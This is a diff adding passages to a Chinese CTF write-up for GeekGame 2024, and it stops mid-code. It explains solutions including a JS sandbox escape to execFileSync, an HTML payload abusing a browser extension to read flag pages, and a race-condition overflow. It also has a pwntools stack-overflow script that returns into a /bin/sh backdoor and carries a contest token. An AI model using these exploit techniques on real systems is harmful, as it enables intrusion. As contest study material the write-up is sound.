@@ -2,7 +2,7 @@
 
 不愧是你北，题出得很有难度，形式挺多。不过有时候不太能猜出来出题人的意图。
 
-文件夹乱七八糟的，不想压缩了，全塞 markdown 里吧，有需要的话我可以把仓库公开。
+文件夹乱七八糟的，不想压缩了，全塞 markdown 里吧，结束以后大概会公开[仓库](https://github.com/TheVeryDarkness/geekgame-2024.git)。
 
 （这次分配到了一个整数 UID，非常棒）
 
@@ -548,6 +548,8 @@ _2/2_
 
 1. 很早就找到了原生 `eval` 函数的调用方式（虽然借助 `$` 可能是多此一举），但一开始以为可以直接读取文本框的内容，后来发现点击按钮的时候就会清空文本框，之后在 js 源码里翻了很久也没找到可以访问的全局变量，看到提示之后才通过分析堆快照发现能够从 DOM 树上访问。
 
+   具体来说就是先输入一次 `console.log("flag{fake_flag}")`，然后在堆快照中搜索 `flag{fake_flag}`，匹配并不多，找到一条从 `window` 到叶子结点全部是紫色的路径（虽然不完全理解紫色和灰色代表什么），根据路径写选择器就行。
+
    ```js
    $.globalEval(
      'for (const d of document.getElementsByClassName("CodeMirror")[0].CodeMirror.doc.history.done)if ("changes" in d) document.title += JSON.stringify(d.changes[0].text);'
@@ -556,7 +558,9 @@ _2/2_
 
 2. `nodejs` 里面很多全局变量都没了，但是没关系，`eval` 其实没被禁止，赋给某个变量的域以后就可以使用了。
 
-   不过一开始以为是 `commonjs` 格式，写了 `require` 发现没定义以后搜了一下，似乎是 `esm` 格式（一开始搜出来的是 nodejs 的 binding），所以导入 `fs` 模块后调用 `execFileSync`。
+   不过一开始以为是 nodejs 默认的 commonjs 格式，写了 `require` 发现没定义以后搜了一下，似乎是 `esm` 格式，所以导入 `fs` 模块后调用 `execFileSync`，并把输出返回。
+
+   一开始搜出来说不能用 `fs` 模块的话可以用 nodejs 的 binding，但是传参有一点复杂，没写明白。最后换了一下搜索词才意识到是 `es` 模块不能使用 `require`。
 
    ```js
    // console.log(global)
@@ -599,3 +603,866 @@ _1/3_
 _(0+2)/2_
 
 第一阶段的代码太长了不会看，第二阶段终于慢慢理解了。
+
+首先扫了一眼代码不是很能理解，然后打开浏览器看了一下插件的效果，看到点击搜索同款后左边弹出的图片时意识到可能可以利用图片的 `src`，让插件来帮我们访问 flag 所在的网页，大不了让插件先登陆一次。
+
+尝试把图片的 `src` 属性改成 flag 所在的网页后，点击 `iframe` 中图片，查看 `src` 属性，发现变成了网页的 data url。
+
+然而访问不了 `iframe` 内的图片的数据，再次查看插件的代码，发现 `background.bundle.js` 里给窗口传递的 `sendDataToContentScript` 事件中包含了细节，于是监听这个事件并输出，获取到了 flag2，同时顺便获取到了 flag1。
+
+去掉注释后的 HTML 代码：
+
+```html
+<body style="overflow: visible">
+  <image
+    id="my_img"
+    src="127.0.0.1:30000/login"
+    style="
+      width: 100vw;
+      height: 100vh;
+      background-image: url(http://127.0.1.14:1919/login);
+    "
+  ></image>
+  <iframe src="http://127.0.1.14:1919/read_flag"></iframe>
+</body>
+<script defer>
+  function _log(e) {
+    console.log(e);
+    document.title += e;
+  }
+  window.addEventListener("message", function (e) {
+    _log(e);
+  });
+  window.addEventListener("sendDataToContentScript", function (e) {
+    _log(e);
+    _log(JSON.stringify(e.detail));
+  });
+  setTimeout(() => {
+    /** @type {HTMLImageElement} */
+    var my_img = document.getElementById("my_img");
+    my_img.focus();
+    my_img.dispatchEvent(
+      new MouseEvent("mousemove", {
+        bubbles: true,
+        target: my_img,
+        clientX: 10,
+        clientY: 10,
+      })
+    );
+
+    my_img.src = "http://127.0.1.14:1919/read_flag";
+
+    var search = document.getElementsByClassName(
+      "index-module__imgSearch_hover_content_text--WI0by"
+    )[0];
+    _log("Found search");
+    search.click();
+
+    var ifr = document.getElementsByTagName("iframe")[0];
+    ifr.addEventListener("message", function (e) {
+      _log(e);
+    });
+
+    var close = document.getElementsByClassName(
+      "index-module__closeIconWrapper--fA3Su"
+    )[0];
+    close.click();
+
+    setTimeout(() => {
+      search.click();
+    }, 1000);
+  }, 1000);
+</script>
+```
+
+## Fast Or Clever
+
+_1/1_
+
+首先用 IDA 反编译了一下代码，发现可以通过缓冲区溢出设置 `usleep_time` 的值，然后抢先修改 `size` 的值（这一步还是不能太慢），然后通过 `do_output` 函数泄露 flag。以下是当时写的注释：
+
+```python
+
+# 4060 --- p
+# 4160 --- usleep_time
+# 4180 --- flag_buf (secret)
+# 41C0 --- output_buf
+# 4200 --- buf
+# 4230 --- size
+
+# Call main:
+# scanf -> size      # Must be 4
+# read(0, &p, 0x104)
+
+# Call do_output:
+# check size <= 4
+# check size > 0
+# check strlen(flag_buf) <= 48
+# sleep usleep_time
+
+# Switch to get_thread2_input:
+# scanf -> size
+# check size <= 49
+# memcpy buf p size
+# print "input success!"
+
+# Back to do_output:
+# memcpy output_buf flag_buf size # size is 48
+# puts output_buf                 # Leak flag
+```
+
+做这题的时候还没注意到 `pwntools` 中的交互功能，`nc` 或者终端貌似只能输入可打印字符，所以选择了一个比较笨的方法。以下是构造的输入：
+
+```txt
+4
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!!
+46
+```
+
+## 从零开始学 Python
+
+_(2+1)/3_
+
+首先 IDA 起手，感觉实现了某个虚拟机，猜测是 PyInstaller 打包的，先用[pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor)解压，然后用 [Decompyle++](https://github.com/zrax/pycdc) 反编译了几个文件，发现 `pymaster` 中执行的是一段 `marshal` 序列化的代码，然后用 `marshal` 模块反序列化，得到了一段代码。
+
+```python
+# Source Generated with Decompyle++
+# File: pymaster.pyc (Python 3.8)
+
+import marshal
+import random
+import base64
+if random.randint(0, 65535) == 54830:
+    exec(marshal.loads(base64.b64decode(b'YwAAAAAAAAAAAAAAAAAAAAAFAAAAQAAAAHMwAAAAZABaAGUBZAGDAWUCZQNkAoMBZAODAmUCZQNkBIMBZAWDAmUAgwGDAYMBAQBkBlMAKQdztAQAAGVKekZWMTFQMnpBVWZhL1UvMkN5bDBSanlCV3NiR2g3R0N2ZFlCMHBHNkFGeEt5MGRkdWdORUg1Z0VRVC8zMTIzQ1NPN1RSdDBiUlVhdFBjYzI5OGo0K3ZyNTNGZ3g5RUlMQzlpYjlvdHh6MmQyU0h1SHZRYnJWYnI4RFV0V2NkOEJGbzlPWlA2c2ZvVTdDUG9xOG42THY5OHhJSHlPeWpvWFU0aDk2elJqM2FyYkZyaHlHd0oyZGZnc3RmcG5WKzFHNEJjazN3RkNEa2VFNkVrRjVZaDd2QUpGZjJEWTBsbEY0bFlvOEN5QWpvVDUwZE1qdXNzVVBxZis1N1dHMkhacE1kRm5aRmhxUFZHZFprZFVvdUxtb2VvSXhhSWFtNDkvbHdUM1BIeFp5TnBickRvbkk0ZWpsVEViZ2tSb21XUENoTzhpZkVLZnlFUkl0YlR4Y0NHTEl2ZGtQVlVPcENYamVFeEM1SlFwZmpOZWVsOFBFbUV0VXFaM1VFUTVIVldpVFZNYlVOdzF2VEFWOU1COXlPRG1tQ042SGpuNm5qNVhSc3FZNm1qT3I4bW9XaFhIYmJydUoxaDY0b2U5ZVZzcGZ3eEtTa1hDWUMvVWxlblZPQlZUS3o3RkZOT1dUR2ZHOUl1TGNVejdLYlNzUmtWY21VYTN0YUFqS3BKZFF6cWEyZG5FVjBsbWFueE1JcU5zMzlrd3BKTEtWVVNibTNCdVdtUUxtWlV3NWx5dUVxeXVGL3BSeXVTK05LeWswRjVYQWp5cE5OT2lCU2hiaDJTdWZRQ25ETWd4a3RKVXJaQ1FsTlJGd3plMHZmRWllMUYxbWY5b0ZEWkozYnFySlNHV3lzcUl0TmRVa09vR29CODNJTUpIVnRwSzB5bmlDeVplTExBaStsek10R0hVTktrbGVseWtWVllMbUcwVGRZbzFyUjNBVnZYNzR2SlBGSG1zYitWUHM5V1FVaGVFM1FhWVJEL2JiQ0xSbm03K1VaWW8vK09GNmt3MTBBazM3ZnVET0VBTXJ4WlBTc2pjeUZIK0FvRGp3UUtwSk5TNWY3UEZtMWF1NjVOU0t0anpYV3hvcDFRUWlWV2VrWVZIQmlJVnB2U1NpVTByd1V1RXc1clJRN3NFQmNUNWZvdXVjamovUmkzeTZlelFuQThSN2lTTmVHTGlhSFI0QzlDQWNnbXVQcy9IZ0V0TUtKY09KaWJzZVpHNVRUL1M2WDFrTkFxZEl1Z3hUWU05dnhkalJPR1d6T1pjSE9iNC9lM3RGUTdLQ3FBVC9nalc4NnpQaXNiZm9pOW1US2h4dVFiTG5ncXByTmNaM29uQWo4aFc3c2tyRk5TZ1lHaHNHL0JkSGdCRHJET2t3NlVMMGxWT1F0elljRDFJdUhTZDBRMEZlMEJtUW4vcjFSOTJDQ3gvNEU2OXJoeWRqOVlRMVB6YkQzT0lpdGI3M2hZSGpqd0xQUndEcCtQN3J3MzMyKzZibjl4NmRqQ3g2T3crNXBUaDAvSjA2bEE3NlNtYmY4R016OHFCREtmakVEZ3RLVk0wVS9EajF5ZS9ZQ0kwUmZwaUcwSUdhRU5GSEVQYXJidjV1T0tGVT3aBGV4ZWPaBHpsaWLaCmRlY29tcHJlc3PaBmJhc2U2NNoJYjY0ZGVjb2RlTikE2gRjb2Rl2gRldmFs2gdnZXRhdHRy2gpfX2ltcG9ydF9fqQByCQAAAHIJAAAA2gDaCDxtb2R1bGU+AQAAAHMKAAAABAEGAQwBEP8C/w==')))
+```
+
+尝试打印打印一下 `marshal.loads` 的结果，发现是一段 `code` 对象，然后用 `dis` 模块反编译，得到了一段 Python 字节码。
+
+```python
+import marshal
+import random
+import base64
+import types
+import dis
+
+code: types.CodeType = marshal.loads(base64.b64decode(b'YwAAAAAAAAAAAAAAAAAAAAAFAAAAQAAAAHMwAAAAZABaAGUBZAGDAWUCZQNkAoMBZAODAmUCZQNkBIMBZAWDAmUAgwGDAYMBAQBkBlMAKQdztAQAAGVKekZWMTFQMnpBVWZhL1UvMkN5bDBSanlCV3NiR2g3R0N2ZFlCMHBHNkFGeEt5MGRkdWdORUg1Z0VRVC8zMTIzQ1NPN1RSdDBiUlVhdFBjYzI5OGo0K3ZyNTNGZ3g5RUlMQzlpYjlvdHh6MmQyU0h1SHZRYnJWYnI4RFV0V2NkOEJGbzlPWlA2c2ZvVTdDUG9xOG42THY5OHhJSHlPeWpvWFU0aDk2elJqM2FyYkZyaHlHd0oyZGZnc3RmcG5WKzFHNEJjazN3RkNEa2VFNkVrRjVZaDd2QUpGZjJEWTBsbEY0bFlvOEN5QWpvVDUwZE1qdXNzVVBxZis1N1dHMkhacE1kRm5aRmhxUFZHZFprZFVvdUxtb2VvSXhhSWFtNDkvbHdUM1BIeFp5TnBickRvbkk0ZWpsVEViZ2tSb21XUENoTzhpZkVLZnlFUkl0YlR4Y0NHTEl2ZGtQVlVPcENYamVFeEM1SlFwZmpOZWVsOFBFbUV0VXFaM1VFUTVIVldpVFZNYlVOdzF2VEFWOU1COXlPRG1tQ042SGpuNm5qNVhSc3FZNm1qT3I4bW9XaFhIYmJydUoxaDY0b2U5ZVZzcGZ3eEtTa1hDWUMvVWxlblZPQlZUS3o3RkZOT1dUR2ZHOUl1TGNVejdLYlNzUmtWY21VYTN0YUFqS3BKZFF6cWEyZG5FVjBsbWFueE1JcU5zMzlrd3BKTEtWVVNibTNCdVdtUUxtWlV3NWx5dUVxeXVGL3BSeXVTK05LeWswRjVYQWp5cE5OT2lCU2hiaDJTdWZRQ25ETWd4a3RKVXJaQ1FsTlJGd3plMHZmRWllMUYxbWY5b0ZEWkozYnFySlNHV3lzcUl0TmRVa09vR29CODNJTUpIVnRwSzB5bmlDeVplTExBaStsek10R0hVTktrbGVseWtWVllMbUcwVGRZbzFyUjNBVnZYNzR2SlBGSG1zYitWUHM5V1FVaGVFM1FhWVJEL2JiQ0xSbm03K1VaWW8vK09GNmt3MTBBazM3ZnVET0VBTXJ4WlBTc2pjeUZIK0FvRGp3UUtwSk5TNWY3UEZtMWF1NjVOU0t0anpYV3hvcDFRUWlWV2VrWVZIQmlJVnB2U1NpVTByd1V1RXc1clJRN3NFQmNUNWZvdXVjamovUmkzeTZlelFuQThSN2lTTmVHTGlhSFI0QzlDQWNnbXVQcy9IZ0V0TUtKY09KaWJzZVpHNVRUL1M2WDFrTkFxZEl1Z3hUWU05dnhkalJPR1d6T1pjSE9iNC9lM3RGUTdLQ3FBVC9nalc4NnpQaXNiZm9pOW1US2h4dVFiTG5ncXByTmNaM29uQWo4aFc3c2tyRk5TZ1lHaHNHL0JkSGdCRHJET2t3NlVMMGxWT1F0elljRDFJdUhTZDBRMEZlMEJtUW4vcjFSOTJDQ3gvNEU2OXJoeWRqOVlRMVB6YkQzT0lpdGI3M2hZSGpqd0xQUndEcCtQN3J3MzMyKzZibjl4NmRqQ3g2T3crNXBUaDAvSjA2bEE3NlNtYmY4R016OHFCREtmakVEZ3RLVk0wVS9EajF5ZS9ZQ0kwUmZwaUcwSUdhRU5GSEVQYXJidjV1T0tGVT3aBGV4ZWPaBHpsaWLaCmRlY29tcHJlc3PaBmJhc2U2NNoJYjY0ZGVjb2RlTikE2gRjb2Rl2gRldmFs2gdnZXRhdHRy2gpfX2ltcG9ydF9fqQByCQAAAHIJAAAA2gDaCDxtb2R1bGU+AQAAAHMKAAAABAEGAQwBEP8C/w=='))
+print(code.co_name)
+print(code.co_code)
+
+dis.dis(code)
+dis.show_code(code)
+dis.disassemble(code)
+```
+
+尝试获取一下 `eval` 接收到的参数：
+
+```python
+import base64
+import zlib
+
+code = b'eJzFV11P2zAUfa/U/2Cyl0RjyBWsbGh7GCvdYB0pG6AFxKy0ddugNEH5gEQT/3123CSO7TRt0bRUatPcc298j4+vr53Fgx9EILC9ib9otxz2d2SHuHvQbrVbr8DUtWcd8BFo9OZP6sfoU7CPoq8n6Lv98xIHyOyjoXU4h96zRj3arbFrhyGwJ2dfgstfpnV+1G4Bck3wFCDkeE6EkF5Yh7vAJFf2DY0llF4lYo8CyAjoT50dMjussUPqf+57WG2HZpMdFnZFhqPVGdZkdUouLmoeoIxaIam49/lwT3PHxZyNpbrDonI4ejlTEbgkRomWPChO8ifEKfyERItbTxcCGLIvdkPVUOpCXjeExC5JQpfjNeel8PEmEtUqZ3UEQ5HVWiTVMbUNw1vTAV9MB9yODmmCN6Hjn6nj5XRsqY6mjOr8moWhXHbbruJ1h64oe9eVspfwxKSkXCYC/UlenVOBVTKz7FFNOWTGfG9IuLcUz7KbSsRkVcmUa3taAjKpJdQzqa2dnEV0lmanxMIqNs39kwpJLKVUSbm3BuWmQLmZUw5lyuEqyuF/pRyuS+NKyk0F5XAjypNNOiBShbh2SufQCnDMgxktJUrZCQlNRFwze0vfEie1F1mf9oFDZJ3bqrJSGWysqItNdUkOoGoB83IMJHVtpK0yniCyZeLLAi+lzMtGHUNKklelykVVYLmG0TdYo1rR3AVvX74vJPFHmsb+VPs9WQUheE3QaYRD/bbCLRnm7+UZYo/+OF6kw10Ak37fuDOEAMrxZPSsjcyFH+AoDjwQKpJNS5f7PFm1au65NSKtjzXWxop1QQiVWekYVHBiIVpvSSiU0rwUuEw5rRQ7sEBcT5fouucjj/Ri3y6ezQnA8R7iSNeGLiaHR4C9CAcgmuPs/HgEtMKJcOJibseZG5TT/S6X1kNAqdIugxTYM9vxdjROGWzOZcHOb4/e3tFQ7KCqAT/gjW86zPisbfoi9mTKhxuQbLngqprNcZ3onAj8hW7skrFNSgYGhsG/BdHgBDrDOkw6UL0lVOQtzYcD1IuHSd0Q0Fe0BmQn/r1R92CCx/4E69rhydj9YQ1PzbD3OIitb73hYHjjwLPRwDp+P7rw332+6bn9x6djCx6Ow+5pTh0/J06lA76Smbf8GMz8qBDKfjEDgtKVM0U/Dj1ye/YCI0RfpiG0IGaENFHEParbv5uOKFU='
+
+s = zlib.decompress(base64.b64decode(code))
+print(s.decode())
+```
+
+在文件开头的注释中得到 flag1。
+
+但是注意到这个程序每次执行都能执行到上述代码，猜测固定了随机数种子，反编译了一下 `random.pyc`，从 Random 类构造函数的默认参数中得到 flag2。
+
+这个树有一点复杂，花了很多时间理解，猜测是某种树，第一个循环是树的构造；并且发现创建节点后对节点中的两个数据不会再修改，推测修改输入字符串中的某一位后，输出字符串最多会修改一位。写了一段脚本验证了一下猜想，接下来找出了不同位之间的对应关系，并且开始爆破。
+
+```python
+# 省略掉了一些代码
+if __name__ == "__main__":
+    mapping: dict[int, int] = {}
+    fake = "flag{.?J:[r](Z0b|/';<_>CYU,7XcQ123#}"
+    assert len(set(fake)) == 36
+    base = main(fake) # 把原来的 main 函数中通过 input 输入参数改成直接传参
+    for i in range(5, 35):
+        flag = fake[:i] + '\\' + fake[i+1:]
+        new_res = main(flag)
+        for c in range(len(base)):
+            if base[c] != new_res[c]:
+                mapping[i] = c
+                print(i, c)
+                break
+    print(len(mapping), mapping)
+
+    result = list('flag{'+'·'*30+'}')
+
+    new_base = base64.b64decode("7EclRYPIOsDvLuYKDPLPZi0JbLYB9bQo8CZDlFvwBY07cs6I")
+    for i in range(5, 35):
+        if new_base[mapping[i]] == base[mapping[i]]:
+            result[i] = fake[i]
+            continue
+        for c in range(0x20, 0x7F):
+            flag = fake[:i] + chr(c) + fake[i+1:]
+            new_res = main(flag)
+            if new_base[mapping[i]] == new_res[mapping[i]]:
+                result[i] = chr(c)
+                print('ok', i, chr(c))
+                break
+        else:
+            print('oops', i)
+
+    print(''.join(result))
+```
+
+## 生活在树上
+
+_(0+1)/3_
+
+（flag1 的提示对我没啥用，要是第一阶段能做出来就好了）
+
+反编译后稍作修改得到：
+
+```c
+// 00000000004040A0 __int32 node_tops[0x20]
+// 0000000000404120 __int32 node_cnt
+
+struct Node {
+  __int64 key;
+  char data[8];
+  __int64 size;
+}
+
+int __fastcall print_node(__int64 a1)
+{
+  printf("key: %d\n", *(_DWORD *)a1);
+  printf("size: %d\n", *(_DWORD *)(a1 + 16));
+  return printf("data: %s\n", *(const char **)(a1 + 8));
+}
+
+// 40122c
+int backdoor()
+{
+  puts("congratulations! you reach the backdoor!");
+  return system("/bin/sh");
+}
+
+int print_info()
+{
+  puts("1. insert a node");
+  puts("2. show a node");
+  puts("3. edit a node");
+  puts("4. quit");
+  return puts(">> ");
+}
+
+// 401316
+int __fastcall insert(_BYTE a1[0x200])
+{
+  int v1; // eax
+  int v3; // eax
+  int size; // [rsp+18h] [rbp-18h] BYREF
+  int key; // [rsp+1Ch] [rbp-14h] BYREF
+  __int64 v6; // [rsp+20h] [rbp-10h]
+  int v7; // [rsp+2Ch] [rbp-4h]
+
+  puts("please enter the node key:");
+  __isoc99_scanf("%d", &key);
+  puts("please enter the size of the data:");
+  __isoc99_scanf("%d", &size);
+  if ( node_cnt )
+    v1 = node_tops[node_cnt - 1];
+  else
+    v1 = 0;
+  v7 = v1;
+  if ( (unsigned __int64)(size + v1 + 24LL) > 0x200 )
+    return puts("no enough space");
+  v3 = node_cnt++;
+  node_tops[v3] = size + v7 + 24;
+  v6 = a1 + v7;
+  *(_DWORD *)v6 = key;
+  *(_DWORD *)(v6 + 16) = size + 24;
+  *(_QWORD *)(v6 + 8) = v6 + 24;
+  puts("please enter the data:");
+  read(0, *(void **)(v6 + 8), *(unsigned int *)(v6 + 16));
+  return puts("insert success!");
+}
+
+// 40147f
+__int64 __fastcall show(__int64 a1)
+{
+  __int64 result; // rax
+  int v2; // [rsp+1Ch] [rbp-14h] BYREF
+  _DWORD *v3; // [rsp+20h] [rbp-10h]
+  int i; // [rsp+2Ch] [rbp-4h]
+
+  puts("please enter the key of the node you want to show:");
+  __isoc99_scanf("%d", &v2);
+  if ( node_cnt > 0 )
+    print_node(a1);
+  for ( i = 1; ; ++i )
+  {
+    result = (unsigned int)node_cnt;
+    if ( i >= node_cnt )
+      break;
+    v3 = (_DWORD *)((int)node_tops[i - 1] + a1);
+    if ( *v3 == v2 )
+      return print_node(v3);
+  }
+  return result;
+}
+
+int edit()
+{
+  return puts("sorry, not implemented :(");
+}
+
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int option; // [rsp+Ch] [rbp-204h] BYREF
+  _BYTE buffer[0x200]; // [rsp+10h] [rbp-200h] BYREF
+
+  init(argc, argv, envp);
+  node_cnt = 0;
+  do
+  {
+    print_info();
+    __isoc99_scanf("%d", &option);
+    if ( option == 3 )
+    {
+      edit();
+    }
+    else if ( option <= 3 )
+    {
+      if ( option == 1 )
+      {
+        insert(buffer);
+      }
+      else if ( option == 2 )
+      {
+        show(buffer);
+      }
+    }
+  }
+  while ( option != 4 );
+  return 0;
+}
+```
+
+发现没有检查数据大小（`read` 函数的字符数量为 0 时可以写入任意长度的输入），可以通过栈溢出来修改返回地址。但是由于 backdoor 的地址不能表示为可打印字符，所以又卡了我一下，还好搜了一下往年的 writeup，发现可以用 `pwntools` 直接连接网页终端。
+
+具体思路是：
+
+1. 先插入一个节点，把多余的栈空间消耗掉。
+2. 再插入一个节点，指定数据大小为 0，写入多余的数据，覆盖返回地址。新的返回地址是 `0x401234`，应该是第一条指令的地址。
+3. 选择退出，触发返回。
+
+```python
+# https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob10-babystack/sol/babystack.py
+from pwn import *
+
+context(log_level='debug', arch='amd64', os='linux')
+#  nc prob12.geekgame.pku.edu.cn 10012
+# p = remote("thuctf.redbud.info", 49310)
+p = remote("prob12.geekgame.pku.edu.cn", 10012)
+p.recvuntil("Please input your token: ")
+p.sendline(b"256:MEYCIQDRGm_v_YIBd5HzshlAQwahPR0eXiFMI_zAzZU-JLvAFQIhAO6SCgDNRpeZMHHqc6G6zi_B6IEYFis9m8q7Nq5xMV9H")
+# p.recvuntil("EOF included!)\n")
+# p.sendline(b"0")
+# p.sendline(b"a"*0x78+p64(0x40134e)+p64(0x4011b6))
+
+p.recvuntil(">> \n")
+p.sendline(b"1")
+p.recvuntil("please enter the node key:\n")
+p.sendline(b"1")
+p.recvuntil("please enter the size of the data:")
+p.sendline(f"{512-24-24}".encode())
+p.recvuntil("please enter the data:")
+p.sendline(b"-"*6)
+
+p.recvuntil(">> \n")
+p.sendline(b"1")
+p.recvuntil("please enter the node key:\n")
+p.sendline(b"4")
+p.recvuntil("please enter the size of the data:")
+p.sendline(b"0")
+p.recvuntil("please enter the data:")
+p.sendline(b"12345678"+p64(0x401234))
+
+p.sendline(b"4")
+
+p.interactive()
+```
+
+flag2 找了半天发现似乎只能修改高 2GB 的地址，返回地址被保护了没办法修改，就做不出来了。
+
+## 大整数类
+
+_0/2_
+
+看到这么复杂的代码就不想看了，看了一会发现还是不会做，告辞。
+
+## 完美的代码
+
+_1/2_
+
+~~第一回见考 nightly 特性的题目。~~
+
+通读了一下代码，感觉没什么毛病~~nightly rustc 不在知识范围内~~，但是试探的时候发现创建长度为 0 的 `Boxed` 数据后可以任意写入并得到 `Some`，但是没有崩溃；最后在疯狂的试探中发现直接写入下标 0 就行。
+
+```txt
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+1
+Please choose:
+1. Boxed
+2. Global
+3. Local
+Enter the choice:
+1
+Enter the size:
+1024
+Please choice
+1. Read only
+2. Write only
+3. Read write
+Enter the choice:
+3
+Slot: 0
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+3
+Enter the slot:
+0
+Enter the index:
+1024
+Enter the value:
+3
+Please choose:
+1. Write (unwrap)
+2. Write (try)
+3. Write (unchecked)
+Enter the choice:
+2
+Result: None
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+1
+Please choose:
+1. Boxed
+2. Global
+3. Local
+Enter the choice:
+1
+Enter the size:
+0
+Please choice
+1. Read only
+2. Write only
+3. Read write
+Enter the choice:
+3
+Slot: 1
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+2
+Enter the slot:
+1
+Enter the index:
+
+0
+Please choose:
+1. Read (unwrap)
+2. Read (try)
+3. Read (unchecked)
+Enter the choice:
+2
+Result: None
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+2
+Enter the slot:
+0
+Enter the index:
+2
+Please choose:
+1. Read (unwrap)
+2. Read (try)
+3. Read (unchecked)
+Enter the choice:
+1
+Result: 0
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+3
+Enter the slot:
+0
+Enter the index:
+0
+Enter the value:
+2
+Please choose:
+1. Write (unwrap)
+2. Write (try)
+3. Write (unchecked)
+Enter the choice:
+2
+Result: None
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+3
+Enter the slot:
+1
+Enter the index:
+0
+Enter the value:
+4
+Please choose:
+1. Write (unwrap)
+2. Write (try)
+3. Write (unchecked)
+Enter the choice:
+1
+Segmentation fault (core dumped)
+```
+
+```txt
+Please input your token: ##############################Token我就不交了##############################
+Running...
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+1
+Please choose:
+1. Boxed
+2. Global
+3. Local
+Enter the choice:
+1
+Enter the size:
+1024
+Please choice
+1. Read only
+2. Write only
+3. Read write
+Enter the choice:
+3
+Slot: 0
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+3
+Enter the slot:
+0
+Enter the index:
+1024
+Enter the value:
+3
+Please choose:
+1. Write (unwrap)
+2. Write (try)
+3. Write (unchecked)
+Enter the choice:
+2
+Result: None
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+1
+Please choose:
+1. Boxed
+2. Global
+3. Local
+Enter the choice:
+1
+Enter the size:
+0
+Please choice
+1. Read only
+2. Write only
+3. Read write
+Enter the choice:
+3
+Slot: 1
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+2
+Enter the slot:
+1
+Enter the index:
+0
+Please choose:
+1. Read (unwrap)
+2. Read (try)
+3. Read (unchecked)
+Enter the choice:
+2
+Result: None
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+2
+Enter the slot:
+0
+Enter the index:
+2
+Please choose:
+1. Read (unwrap)
+2. Read (try)
+3. Read (unchecked)
+Enter the choice:
+1
+Result: 0
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+3
+Enter the slot:
+0
+Enter the index:
+0
+Enter the value:
+2
+Please choose:
+1. Write (unwrap)
+2. Write (try)
+3. Write (unchecked)
+Enter the choice:
+2
+Result: None
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+3
+Enter the slot:
+1
+Enter the index:
+0
+Enter the value:
+4
+Please choose:
+1. Write (unwrap)
+2. Write (try)
+3. Write (unchecked)
+Enter the choice:
+1
+Here is Flag 1: flag{w0W_But-do-y0u-kN0w-Why_1T_SEgV}
+See you later~
+
+--- 程序已退出 [retcode=0] ---
+
+
+--- 连接中断 ---
+```
+
+优化过的触发方式：
+
+```
+Please input your token: 256:MEYCIQDRGm_v_YIBd5HzshlAQwahPR0eXiFMI_zAzZU-JLvAFQIhAO6SCgDNRpeZMHHqc6G6zi_B6IEYFis9m8q7Nq5xMV9H
+Running...
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+1
+Please choose:
+1. Boxed
+2. Global
+3. Local
+Enter the choice:
+1
+Enter the size:
+0
+Please choice
+1. Read only
+2. Write only
+3. Read write
+Enter the choice:
+3
+Slot: 0
+Please choose:
+1. Create
+2. Read
+3. Write
+Enter the choice:
+3
+Enter the slot:
+0
+Enter the index:
+0
+Enter the value:
+1
+Please choose:
+1. Write (unwrap)
+2. Write (try)
+3. Write (unchecked)
+Enter the choice:
+1
+Here is Flag 1: flag{w0W_But-do-y0u-kN0w-Why_1T_SEgV}
+See you later~
+
+--- 程序已退出 [retcode=0] ---
+
+
+--- 连接中断 ---
+```
+
+第二问试了几次，一直崩溃，没时间做了。
+
+## 打破复杂度
+
+_2/2_
+
+直接搜索导致两个算法进入最坏时间复杂度的情况，微调一下就好了，塞了一堆没用的边（权重过大的边、反向边、流量过小的边）。（另外两个检验代码中最好加上 `assert(cin);`）
+
+来源在代码开头：
+
+```python
+# Generate worst case input for SPFA algorithm
+# Based on <https://stackoverflow.com/questions/36999061/worst-test-case-for-spfa>
+N = 2000
+M = N*3-3
+
+print(N, M, 1, N)
+
+for i in range(1, N+1):
+    if i+1 <= N:
+        print(i, (i+1) % N+1, 1)
+    if i > 1:
+        print(1, i, N*3-i*2)
+        print(i, 1, N*100)
+```
+
+```python
+# Generate worst case input for dinic algorithm
+# <https://www.sciencedirect.com/science/article/pii/089396599190145L>
+N = 100
+
+edges = []
+
+for i in range(1, N+1):
+    if i + 1 < N:
+        edges.append((i, i+1, N))
+    for j in range(1, min(i, 70)):
+        edges.append((i, j, 1))
+    if i < N:
+        edges.append((i, N, 1))
+
+
+print(N, len(edges), 1, N)
+
+for u, v, w in edges:
+    print(u, v, w)
+```
+
+## 鉴定网络热门烂梗
+
+_0/2_
+
+找了个 [Python3 的解码库](https://github.com/vadmium/pyflate)但是不知道怎么改，寄。
+
+## 随机数生成器
+
+_1/3_
+
+flag1 直接爆破（用了一台 Ubuntu 服务器，不过 g++ 版本好像是 10+），不过花了一个小时左右。
+
+```cpp
+// g++ solve.cpp -O3 -o solve.exe && ./solve.exe
+// flag{DO_y0U_enumEraTED_a1l_se3d5?}flag{DO_y0U_enumEraTED_a1l_se3d5?}flag{DO_y0U_enumEraTED_a1l_se3d5?}flag{DO_y0U_enumEraTED_a1l
+#include <cassert>
+#include <cstring>
+#include <fstream>
